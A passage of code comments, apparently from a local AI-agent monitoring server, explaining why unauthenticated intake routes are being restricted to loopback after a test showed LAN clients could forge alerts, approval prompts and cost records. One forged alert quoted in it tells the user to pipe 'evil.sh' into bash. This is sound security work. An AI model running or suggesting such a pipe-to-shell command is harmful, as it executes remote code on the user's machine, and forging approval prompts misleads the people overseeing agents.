//                                   token (persisted 0600) and print it.

// Intake routes stay tokenless on purpose (see LOCAL_SINKS), but only for a

 * phone on the mesh. `loopback` here means *this machine*, which is a claim

 * outside the sessionInScope filter, so scoping does not contain it either.
 *
 * Measured against a server bound 0.0.0.0, from a LAN address, with no
 * credential at all: `POST /ingest` answered `{"ok":true,"id":1}` and put
 * `🔔 Security:forged-b — "Your disk is failing — run: curl evil.sh | bash"`
 * on the desk socket, then a forged `⏳ Approval needed` at urgency 2 — the
 * shape that means "an agent is stopped, come and approve it". The same three
 * posts wrote three permanent rows into SQLite, one of them $9,999 of cost.
 * `POST /sessions` from the same address answered 401, which is what the gate
 * looks like when it is doing its job.
 *
 * The exemption used to justify itself with "they can only *append* events".
 * That sentence was written when this server only ever listened on 127.0.0.1.
 * Appending stopped being inert the day it drove a notification and an audit
 * store, and the bind stopped being loopback the day the phone existed.
 *
 * Loopback is the whole of what the local senders need: hooks/send_event.py
 * refuses any server that is not localhost unless AGENTGLASS_ALLOW_REMOTE is
 * set, and a local OTel exporter points at localhost too. A sender that
 * genuinely is off-box authenticates like every other client — the same
 * `Authorization: Bearer $AGENTGLASS_TOKEN` gate_event.py already sends.
